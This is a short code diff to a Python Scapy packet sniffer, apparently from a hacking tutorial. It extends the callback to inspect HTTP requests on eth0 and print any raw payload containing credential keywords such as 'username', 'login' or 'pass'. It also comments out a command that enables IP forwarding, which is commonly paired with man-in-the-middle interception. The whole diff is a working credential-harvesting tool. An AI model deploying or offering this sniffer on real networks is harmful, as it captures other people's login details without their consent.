@@ -18,8 +18,15 @@ def process_sniffed_packet(packet):
     # method that's implemented by Scapy that checks if this packet has data that is being
     # sent over the layer that we specify in here, so we can give any layer we want.
     if packet.haslayer(http.HTTPRequest):
-        print(packet)
+        print(packet.show())
+        if packet.haslayer(scapy.Raw):
+            load = packet[scapy.Raw].load
+            keywords = ["username", "user", "login", "passwords", "pass"]
+            for keyword in keywords:
+                if keyword in load:
+                    print(load)
+                    break
 
 
-os.system("echo 1 > /proc/sys/net/ipv4/ip_forward")
+# os.system("echo 1 > /proc/sys/net/ipv4/ip_forward")
 sniff("eth0")
